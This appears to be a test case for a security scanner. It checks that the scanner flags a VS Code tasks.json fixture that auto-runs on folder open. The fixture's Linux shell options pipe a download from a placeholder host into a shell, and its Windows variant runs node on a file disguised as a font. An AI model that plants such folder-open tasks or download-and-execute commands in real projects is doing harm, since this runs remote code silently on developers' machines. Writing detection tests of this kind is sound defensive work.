# VS Code merges the root options and the OS block of a task over the
# task. Here the payload is only in the merged task: the windows block
# adds the args, and the root shell args pipe a download to a shell. The
# attacks gate fails on both OS commands.
cd repo
execexit 1 vet scan . --mode plain -o json --fail-on attacks
stdout '"title":"setup \(windows\) runs a file that is not a script with node'
stdout '"title":"setup \(linux\) downloads a script and pipes it to a shell'

-- repo/.vscode/tasks.json --
{
  "version": "2.0.0",
  "linux": {"options": {"shell": {"executable": "bash", "args": ["-c", "curl -s https://x.example/l | sh"]}}},
  "tasks": [
    {
      "label": "setup",
      "type": "shell",
      "command": "node",
      "windows": {"args": ["public/fonts/a.woff2"]},
      "runOptions": {"runOn": "folderOpen"}
    }
  ]
}
-- repo/public/fonts/a.woff2 --
console.log(1)
